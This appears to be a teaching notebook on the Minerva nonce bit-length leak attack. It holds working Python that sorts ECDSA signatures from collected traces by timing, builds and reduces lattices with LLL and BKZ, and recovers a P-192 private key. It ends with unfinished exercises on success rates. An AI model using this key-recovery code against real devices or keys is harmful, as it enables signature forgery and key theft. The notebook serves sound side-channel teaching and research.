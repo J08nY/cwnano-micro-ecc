{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "add212c2",
   "metadata": {},
   "source": [
    "# Nonce bit-length leak attack (Minerva, TPM-FAIL, ...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "563d9bb5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "\n",
    "import numpy as np\n",
    "from fpylll import LLL, BKZ, IntegerMatrix, GSO\n",
    "from pyecsca.sca.trace_set import PickleTraceSet\n",
    "from pyecsca.ec.params import get_params\n",
    "from pyecsca.ec.mod import Mod"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d1ff9be",
   "metadata": {},
   "outputs": [],
   "source": [
    "curve = get_params(\"nist\", \"P-192\", \"projective\")\n",
    "n = curve.order"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30618e16",
   "metadata": {},
   "source": [
    "Read the collected traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c35ddea",
   "metadata": {},
   "outputs": [],
   "source": [
    "trace_set = PickleTraceSet.read(\"traces_collected1.pickle\")\n",
    "\n",
    "# Code for merging trace sets that might come in handy later-on\n",
    "# trace_set_other = PickleTraceSet.read(\"traces_collected2.pickle\")\n",
    "# assert trace_set.pubkey == trace_set_other.pubkey\n",
    "# assert trace_set.hash == trace_set_other.hash\n",
    "# trace_set_merged = PickleTraceSet(list(trace_set) + list(trace_set_other), pubkey=trace_set.pubkey, hash=trace_set.hash, msg=trace_set.msg)\n",
    "# del trace_set\n",
    "# del trace_set_other"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c1c6cb3b",
   "metadata": {},
   "source": [
    "Get the signatures out of the traces and sort them by duration (fastest first). Later on, you will sort them based on the bit-length of the nonces estimated from power trace data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b9d48bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "signatures = [(trace.meta[\"duration\"], trace.meta[\"signature\"], trace_set.hash) for trace in trace_set]\n",
    "signatures.sort()\n",
    "\n",
    "pubkey = trace_set.pubkey"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "00666456",
   "metadata": {},
   "source": [
    "Compute the $t = s^{-1} r$ and $u = - s^{-1} h$ values from the signatures. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52c80a64",
   "metadata": {},
   "outputs": [],
   "source": [
    "def compute_tu(r: int, s: int, h: int):\n",
    "    r = Mod(r, n)\n",
    "    s = Mod(s, n)\n",
    "    h = Mod(h, n)\n",
    "    s_inv = s.inverse()\n",
    "    t = s_inv * r\n",
    "    u = - s_inv * h\n",
    "    return int(t), int(u)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddba694a",
   "metadata": {},
   "source": [
    "Estimate the number of leading zero bits at signature with `index`, assuming sorted `total` of collected signatures."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "46342739",
   "metadata": {},
   "outputs": [],
   "source": [
    "def compute_bound(index: int, total: int):\n",
    "    i = 1\n",
    "    while (total) / (2 ** i) >= index + 1:\n",
    "        i += 1\n",
    "    i -= 1\n",
    "    if i <= 1:\n",
    "        return 0\n",
    "    return i"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4a19ec7",
   "metadata": {},
   "source": [
    "Construct the CVP lattice and target vector.\n",
    "\n",
    "$$\n",
    "B = \\begin{pmatrix}\n",
    "2^{l_1+1}n & 0 & 0 & \\ldots & 0 & 0 \\\\\n",
    "0 & 2^{l_2+1}n & 0 & \\ldots & 0 & 0 \\\\\n",
    "& \\vdots & & & \\vdots & \\\\\n",
    "0 & 0 & 0 & \\ldots & 2^{l_d+1}n & 0 \\\\\n",
    "2^{l_1+1}t_1 & 2^{l_2+1}t_2 & 2^{l_3+1}t_3 & \\ldots & 2^{l_d+1}t_d & 1\n",
    "\\end{pmatrix}\n",
    "$$\n",
    "\n",
    "$$ v = \\begin{pmatrix}2^{l_1+1}u_1 + n & 2^{l_2+1}u_2 + n & \\ldots & 2^{l_d+1}u_d + n & 0\\end{pmatrix} $$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42bfb48a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def construct_cvp(sigs, total):\n",
    "    size = len(sigs)\n",
    "    dim = size + 1\n",
    "    B = IntegerMatrix(dim, dim)\n",
    "    v = [0] * dim\n",
    "    for i, sig in enumerate(sigs):\n",
    "        bound = compute_bound(i, total) + 1\n",
    "        r, s = sig[1]\n",
    "        h = int.from_bytes(sig[2], byteorder=\"big\")\n",
    "        t, u = compute_tu(r, s, h)\n",
    "        \n",
    "        B[i, i] = (2 ** bound) * n\n",
    "        B[size, i] = (2 ** bound) * t\n",
    "        \n",
    "        v[i] = (2 ** bound) * u + n\n",
    "    B[size, size] = 1\n",
    "    return B, v"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "981841cb",
   "metadata": {},
   "source": [
    "Construct the SVP lattice.\n",
    "\n",
    "$$\n",
    "C = \\begin{pmatrix}\n",
    "2^{l_1+1}n & 0 & 0 & \\ldots & 0 & 0 & 0 \\\\\n",
    "0 & 2^{l_2+1}n & 0 & \\ldots & 0 & 0 & 0 \\\\\n",
    "& \\vdots & & & \\vdots & & \\\\\n",
    "0 & 0 & 0 & \\ldots & 2^{l_d+1}n & 0 & 0\\\\\n",
    "2^{l_1+1}t_1 & 2^{l_2+1}t_2 & 2^{l_3+1}t_3 & \\ldots & 2^{l_d+1}t_d & 1 & 0\\\\\n",
    "2^{l_1+1}u_1 + n & 2^{l_2+1}u_2 + n & 2^{l_3+1}u_3 + n & \\ldots & 2^{l_d+1}u_d + n & 0 & n\n",
    "\\end{pmatrix}\n",
    "$$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1066f93e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def construct_svp(sigs, total):\n",
    "    size = len(sigs)\n",
    "    dim = size + 2\n",
    "    C = IntegerMatrix(dim, dim)\n",
    "    sb = 0\n",
    "    for i, sig in enumerate(sigs):\n",
    "        bound = compute_bound(i, total) + 1\n",
    "        r, s = sig[1]\n",
    "        h = int.from_bytes(sig[2], byteorder=\"big\")\n",
    "        t, u = compute_tu(r, s, h)\n",
    "        \n",
    "        C[i, i] = (2 ** bound) * n\n",
    "        C[size, i] = (2 ** bound) * t\n",
    "        \n",
    "        C[size + 1, i] = (2 ** bound) * u + n\n",
    "    C[size, size] = 1\n",
    "    C[size + 1, size + 1] = n\n",
    "    return C"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a38d97ea",
   "metadata": {},
   "source": [
    "Put the steps together, construct the SVP lattice and reduce it. This assumes the signatures are sorted by bit-length (shortest-first)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e610a8dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "def construct_and_reduce_svp(signatures, dim):\n",
    "    #print(f\"Using {dim} signatures out of {len(signatures)}.\")\n",
    "\n",
    "    C = construct_svp(signatures[:dim], len(signatures))\n",
    "    M = GSO.Mat(C)\n",
    "    M.update_gso()\n",
    "    L = LLL.Reduction(M)\n",
    "    L()\n",
    "\n",
    "    C = BKZ.reduction(C, BKZ.Param(30, strategies=BKZ.DEFAULT_STRATEGY, auto_abort=True))\n",
    "    return C"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb3e9067",
   "metadata": {},
   "source": [
    "Extract the private key from the second to last column of the reduced SVP lattice basis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6dfd5297",
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_privkey(lattice, pubkey):\n",
    "    gen = curve.generator.to_affine()\n",
    "    for row in lattice:\n",
    "        privkey_guess = row[-2] % n\n",
    "        if privkey_guess:\n",
    "            #print(f\"Trying privkey guess: {privkey_guess}\")\n",
    "            pubkey_guess = curve.curve.affine_multiply(gen, privkey_guess)\n",
    "            if pubkey_guess.x == pubkey[0] and pubkey_guess.y == pubkey[1]:\n",
    "                return privkey_guess\n",
    "        privkey_guess = (n - privkey_guess) % n\n",
    "        if privkey_guess:\n",
    "            #print(f\"Trying privkey guess: {privkey_guess}\")\n",
    "            pubkey_guess = curve.curve.affine_multiply(gen, privkey_guess)\n",
    "            if pubkey_guess.x == pubkey[0] and pubkey_guess.y == pubkey[1]:\n",
    "                return privkey_guess\n",
    "    return None"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2ec43fd9",
   "metadata": {},
   "source": [
    "## The attack\n",
    "Actually run the attack here, using all of the collected signatures, taking the 50 fastest."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01e6eaca",
   "metadata": {},
   "outputs": [],
   "source": [
    "reduced_lattice = construct_and_reduce_svp(signatures, 50)\n",
    "priv = extract_privkey(reduced_lattice, pubkey)\n",
    "print(f\"The private key is: {priv}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a0f312f",
   "metadata": {},
   "source": [
    "## Success rates\n",
    "Now, lets try to see where the attacks stops (or starts) working. Pick random subsets of all of the signatures of smaller sizes (by steps of 100) and try the attack with those. For each size pick several (5) subsets. Remember to re-sort the subset of the signatures before you use them to mount the attack. Display the success rate for the different subset sizes.\n",
    "\n",
    "What is going on with the success rate and why?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c3365ff9",
   "metadata": {},
   "outputs": [],
   "source": [
    "for rand_subset_size in range(len(signatures), 0, -100):\n",
    "    #TODO: Implement according to the instructions above"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bba8666f",
   "metadata": {},
   "source": [
    "The number of fastest signatures used to build the lattice also influences the attack successs rate. Iterate over the the number from 5 to 100 in steps of 5, for each size pick 5 random subsets of 2000 signatures (if you have enough) and run the attack with them. Display the success rate for the different numbers.\n",
    "\n",
    "What is going on with the success rate and why?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d20fab5b",
   "metadata": {},
   "outputs": [],
   "source": [
    "for dim in range(5, 100, 5):\n",
    "    #TODO: Implement according to the instructions above"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "id": "830af57d",
   "metadata": {},
   "source": [
    "## More info\n",
    "The success rates you just computed looked at the behaviour of the attack in two dimensions: the total number of signatures collected by the attacker and the number of signatures used in the lattice attack. We analyzed the behaviour extensively and you can see it in the solution version of the notebook.\n",
    "\n",
    "For more details you can check out the Minerva paper: https://minerva.crocs.fi.muni.cz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd4ed3f5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
